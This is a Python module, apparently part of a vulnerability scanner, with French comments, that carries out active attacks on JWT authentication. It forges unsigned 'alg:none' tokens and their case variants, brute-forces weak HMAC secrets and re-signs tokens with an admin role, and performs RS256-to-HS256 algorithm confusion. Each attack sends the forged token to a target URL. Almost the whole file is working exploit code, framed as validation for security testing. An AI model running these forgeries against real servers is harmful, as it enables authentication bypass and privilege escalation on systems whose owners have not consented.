"""
active_validator/jwt_attacker.py
──────────────────────────────────
Attaques actives sur les tokens JWT.
Tests : alg:none, weak secret brute-force, algorithm confusion (RS256 → HS256).
"""

import jwt
import base64
import json
import httpx
import hmac
import hashlib
from typing import List, Dict, Any, Optional


# ─── Liste de secrets faibles à tester ───────────────────────────────────────
COMMON_WEAK_SECRETS: List[str] = [
    # Les plus communs
    "secret", "password", "123456", "key", "test", "admin",
    "qwerty", "letmein", "changeme", "default", "pass",
    # Spécifiques JWT
    "mysecret", "jwt_secret", "app_secret", "token", "signing_key",
    "your-256-bit-secret", "supersecret", "private", "jwtpassword",
    # Noms d'applications courants
    "insecurebank", "android", "mobile", "myapp", "application",
    # Clés courtes/triviales
    "a", "1", "abc", "key123", "test123", "hello", "world",
]


class JWTAttacker:
    """
    Effectue des attaques JWT réelles contre un serveur.
    Chaque méthode retourne un evidence dict avec vulnerability_confirmed et proof.
    """

    def analyze_jwt_static(self, token: str) -> List[Dict[str, Any]]:
        findings = []
        try:
            parts = token.split('.')
            if len(parts) < 2:
                findings.append({"type": "JWT_FORMAT_ERROR", "severity": "LOW", "description": "Format JWT invalide (manque des points)."})
                return findings
                
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())
            
            if header.get('alg', '').lower() == 'none':
                findings.append({"type": "JWT_ALG_NONE", "severity": "CRITICAL", "description": "L'algorithme 'none' est autorisé dans le header."})
            
            if 'exp' not in payload:
                findings.append({"type": "JWT_NO_EXPIRATION", "severity": "HIGH", "description": "Le token n'a pas de date d'expiration (exp)."})
            
            sensitive_keys = ['password', 'secret', 'role', 'admin', 'email']
            for key in sensitive_keys:
                if key in payload:
                    findings.append({"type": "JWT_SENSITIVE_DATA", "severity": "MEDIUM", "description": f"Donnée sensible trouvée dans le payload : {key}"})

        except Exception as e:
            findings.append({"type": "JWT_PARSE_ERROR", "severity": "LOW", "description": f"Erreur lors du parsing du JWT: {str(e)}"})
        
        return findings

    async def attack_alg_none(
        self,
        token: str,
        target_url: str,
        method: str = "GET",
    ) -> Dict[str, Any]:
        try:
            parts = token.split('.')
            payload = parts[1]
            
            # Forger le header {"alg": "none", "typ": "JWT"}
            new_header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
            forged_token = f"{new_header}.{payload}."
            
            async with httpx.AsyncClient() as client:
                headers = {"Authorization": f"Bearer {forged_token}"}
                resp = await client.request(method, target_url, headers=headers)
                
                success = resp.status_code == 200
                return {
                    "vulnerability_confirmed": success,
                    "forged_token": forged_token,
                    "status_code": resp.status_code,
                    "summary": "Serveur vulnérable à alg:none !" if success else "Serveur a rejeté le token sans signature."
                }
        except Exception as e:
            return {"error": str(e)}

    async def attack_weak_secret(
        self,
        token: str,
        target_url: str,
        custom_secrets: Optional[List[str]] = None,
    ) -> Dict[str, Any]:
        """
        ATTAQUE : Brute force du secret HMAC sur COMMON_WEAK_SECRETS.

        Méthode :
        1. Essayer chaque secret de la liste pour vérifier la signature
        2. Si un secret fonctionne → re-signer avec des claims modifiés (role: admin)
        3. Tester le token forgé sur le serveur

        Returns:
            Evidence avec secret_found, privilege_escalation, proof
        """
        evidence = {
            "attack_type": "JWT_WEAK_SECRET",
            "vulnerability_confirmed": False,
            "secret_found": None,
            "privilege_escalation": False,
            "proof": []
        }

        if custom_secrets is None:
            custom_secrets = []

        all_secrets = COMMON_WEAK_SECRETS + custom_secrets

        try:
            # Extraire l'algorithme du header original
            parts = token.split('.')
            if len(parts) < 2:
                evidence["proof"].append("Invalid JWT format")
                return evidence

            header = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
            original_alg = header.get('alg', 'HS256')

            # Boucler sur COMMON_WEAK_SECRETS + custom_secrets
            for secret in all_secrets:
                try:
                    # jwt.decode(token, secret, algorithms=[...]) dans try/except
                    decoded = jwt.decode(
                        token,
                        secret,
                        algorithms=[original_alg],
                        options={"verify_signature": True}
                    )

                    # Secret trouvé!
                    evidence["secret_found"] = secret
                    evidence["proof"].append(f"Weak secret found: {secret[:10]}...")

                    # Si secret trouvé → forger un token admin et tester
                    try:
                        # Modifier les claims pour l'escalation de privilèges
                        new_payload = decoded.copy()
                        new_payload["role"] = "admin"
                        new_payload["admin"] = True

                        # Re-signer avec le secret trouvé
                        forged_token = jwt.encode(
                            new_payload,
                            secret,
                            algorithm=original_alg
                        )

                        # Tester le token forgé
                        async with httpx.AsyncClient() as client:
                            test_response = await client.get(
                                target_url,
                                headers={"Authorization": f"Bearer {forged_token}"},
                                timeout=10.0
                            )

                            if test_response.status_code == 200:
                                evidence["privilege_escalation"] = True
                                evidence["vulnerability_confirmed"] = True
                                evidence["proof"].append(
                                    f"Privilege escalation successful! Status: {test_response.status_code}"
                                )
                            else:
                                evidence["proof"].append(
                                    f"Token forged but server rejected: {test_response.status_code}"
                                )

                    except Exception as forge_error:
                        evidence["proof"].append(f"Token forgery failed: {str(forge_error)}")

                    # Si on a trouvé un secret, on peut s'arrêter
                    break

                except jwt.InvalidTokenError:
                    # Secret incorrect, continuer avec le suivant
                    continue
                except Exception as e:
                    evidence["proof"].append(f"Error testing secret {secret[:10]}...: {str(e)}")
                    continue

        except Exception as e:
            evidence["proof"].append(f"Attack failed: {str(e)}")

        return evidence

    async def attack_algorithm_confusion(
        self,
        token: str,
        public_key: str,
        target_url: str,
    ) -> Dict[str, Any]:
        """
        ATTAQUE : Confusion RS256 → HS256.
        Si le serveur utilise RS256, tenter de signer avec la clé publique comme secret HMAC.

        Returns:
            Evidence avec attack_successful
        """
        evidence = {
            "attack_type": "JWT_ALGORITHM_CONFUSION",
            "vulnerability_confirmed": False,
            "attack_successful": False,
            "proof": []
        }

        try:
            # Extraire le payload original
            parts = token.split('.')
            if len(parts) < 2:
                evidence["proof"].append("Invalid JWT format")
                return evidence

            header = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())

            # Vérifier si l'algorithme original est RS256
            original_alg = header.get('alg', '')
            if 'RS' not in original_alg.upper():
                evidence["proof"].append(f"Original algorithm is {original_alg}, not RSA-based")
                return evidence

            # Re-signer le token avec la clé publique comme secret HS256
            try:
                # Modifier le header pour utiliser HS256
                new_header = header.copy()
                new_header['alg'] = 'HS256'

                # Encoder le nouveau header
                new_header_b64 = base64.urlsafe_b64encode(
                    json.dumps(new_header).encode()
                ).decode().rstrip('=')

                # Encoder le payload (inchangé)
                payload_b64 = base64.urlsafe_b64encode(
                    json.dumps(payload).encode()
                ).decode().rstrip('=')

                # Créer la signature avec la clé publique comme secret HMAC
                message = f"{new_header_b64}.{payload_b64}"
                signature = hmac.new(
                    public_key.encode(),
                    message.encode(),
                    hashlib.sha256
                ).digest()

                signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')

                # Construire le token forgé
                forged_token = f"{message}.{signature_b64}"

                # Envoyer et vérifier la réponse
                async with httpx.AsyncClient() as client:
                    test_response = await client.get(
                        target_url,
                        headers={"Authorization": f"Bearer {forged_token}"},
                        timeout=10.0
                    )

                    if test_response.status_code == 200:
                        evidence["attack_successful"] = True
                        evidence["vulnerability_confirmed"] = True
                        evidence["proof"].append(
                            f"Algorithm confusion successful! Server accepted HS256 token with RSA public key as secret. Status: {test_response.status_code}"
                        )
                    else:
                        evidence["proof"].append(
                            f"Algorithm confusion failed. Server rejected token: {test_response.status_code}"
                        )

            except Exception as forge_error:
                evidence["proof"].append(f"Token forgery failed: {str(forge_error)}")

        except Exception as e:
            evidence["proof"].append(f"Attack failed: {str(e)}")

        return evidence

    async def attack_none_variants(
        self,
        token: str,
        target_url: str,
    ) -> Dict[str, Any]:
        """
        ATTAQUE : Tester toutes les variantes de 'none' (None, NONE, nOnE, etc.).
        Certains serveurs filtrent "none" mais pas les variantes.

        Returns:
            Evidence avec la variante qui fonctionne si trouvée
        """
        evidence = {
            "attack_type": "JWT_NONE_VARIANTS",
            "vulnerability_confirmed": False,
            "successful_variant": None,
            "proof": []
        }

        try:
            # Extraire le payload original
            parts = token.split('.')
            if len(parts) < 2:
                evidence["proof"].append("Invalid JWT format")
                return evidence

            original_header = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())

            # Générer les variantes : none, None, NONE, nOnE, NoNe, ...
            none_variants = [
                "none", "None", "NONE", "nOnE", "NoNe", "NOne", "nonE",
                "nOne", "NoNE", "nONe", "nONE", "NoNe", "n0ne", "None",
                "NONE", "n0nE", "N0ne", "N0NE"
            ]

            # Tester chacune
            for variant in none_variants:
                try:
                    # Créer un nouveau header avec la variante de 'none'
                    new_header = original_header.copy()
                    new_header['alg'] = variant

                    # Encoder le nouveau header
                    new_header_b64 = base64.urlsafe_b64encode(
                        json.dumps(new_header).encode()
                    ).decode().rstrip('=')

                    # Encoder le payload (inchangé)
                    payload_b64 = base64.urlsafe_b64encode(
                        json.dumps(payload).encode()
                    ).decode().rstrip('=')

                    # Créer le token sans signature (empty string)
                    forged_token = f"{new_header_b64}.{payload_b64}."

                    # Tester cette variante
                    async with httpx.AsyncClient() as client:
                        test_response = await client.get(
                            target_url,
                            headers={"Authorization": f"Bearer {forged_token}"},
                            timeout=10.0
                        )

                        if test_response.status_code == 200:
                            evidence["successful_variant"] = variant
                            evidence["vulnerability_confirmed"] = True
                            evidence["proof"].append(
                                f"Variant '{variant}' worked! Server accepted unsigned token. Status: {test_response.status_code}"
                            )
                            # On a trouvé une variante qui fonctionne, on peut s'arrêter
                            break
                        else:
                            evidence["proof"].append(
                                f"Variant '{variant}' failed: {test_response.status_code}"
                            )

                except Exception as variant_error:
                    evidence["proof"].append(
                        f"Error testing variant '{variant}': {str(variant_error)}"
                    )
                    continue

        except Exception as e:
            evidence["proof"].append(f"Attack failed: {str(e)}")

        return evidence
